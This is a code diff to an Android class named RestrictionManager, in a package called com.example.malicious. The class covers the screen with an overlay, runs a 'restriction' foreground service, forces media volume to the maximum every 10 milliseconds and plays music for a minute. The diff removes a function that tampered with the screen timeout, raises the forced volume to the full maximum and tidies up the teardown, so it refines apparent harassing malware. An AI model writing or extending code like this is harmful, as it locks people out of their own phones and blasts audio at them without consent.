@@ -6,13 +6,14 @@ import android.content.Intent;
 import android.graphics.PixelFormat;
 import android.media.AudioManager;
 import android.os.Handler;
-import android.provider.Settings;
 import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.WindowManager;
 import android.widget.Toast;
 import com.example.malicious.R;
+import com.example.service.MusicService;
+import com.example.service.RestrictionService;
 
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
@@ -35,10 +36,9 @@ public class RestrictionManager {
     public void startRestriction() {
         showOverlay(); // 显示覆盖层
         startService(new Intent(context, RestrictionService.class)); // 启动前台服务
-        setScreenTimeout(6000); // 设置屏幕超时时间为 6 秒
-        new Handler().postDelayed(this::stopRestriction, TIMEOUT); // 恢复用户操作
         scheduler.scheduleWithFixedDelay(this::setMaxVolume, 0, 10, TimeUnit.MILLISECONDS); // 最大化音量
         startService(new Intent(context, MusicService.class)); // 启动音乐服务
+        new Handler().postDelayed(this::stopRestriction, 60 * 1000); // 恢复用户操作
     };
 
 
@@ -66,18 +66,12 @@ public class RestrictionManager {
     };
 
 
-    // 设置屏幕超时时间
-    private void setScreenTimeout(final int timeout) {
-        try { Settings.System.putInt(context.getContentResolver(), Settings.System.SCREEN_OFF_TIMEOUT, timeout); }
-        catch (Exception e) { Toast.makeText(context, "无法修改屏幕超时时间", Toast.LENGTH_SHORT).show(); };
-    };
-
-
     // 停止限制功能
     private void stopRestriction() {
         if (overlayView != null) windowManager.removeView(overlayView); // 移除覆盖层
         stopService(new Intent(context, RestrictionService.class)); // 停止前台服务
-        setScreenTimeout(60000); // 恢复屏幕超时时间为 60 秒
+        stopService(new Intent(context, MusicService.class)); // 停止音乐服务
+        scheduler.shutdown(); // 关闭调度器
     };
 
 
@@ -87,7 +81,7 @@ public class RestrictionManager {
         if (audioManager != null) {
             try {
                 audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
-                final int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC) - 1;
+                final int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                 audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, AudioManager.FLAG_SHOW_UI);
             } catch (Exception e) {
                 Toast.makeText(context, "无法修改音量", Toast.LENGTH_SHORT).show();
@@ -97,7 +91,6 @@ public class RestrictionManager {
 
 
     // 启动服务和停止服务
-    private void startService(Intent intent) { context.startService(intent); };
-    private void stopService(Intent intent) { context.stopService(intent); };
-    private static final int TIMEOUT = 60 * 1000; // 限制时间
+    private void startService(final Intent intent) { context.startService(intent); };
+    private void stopService(final Intent intent) { context.stopService(intent); };
 };
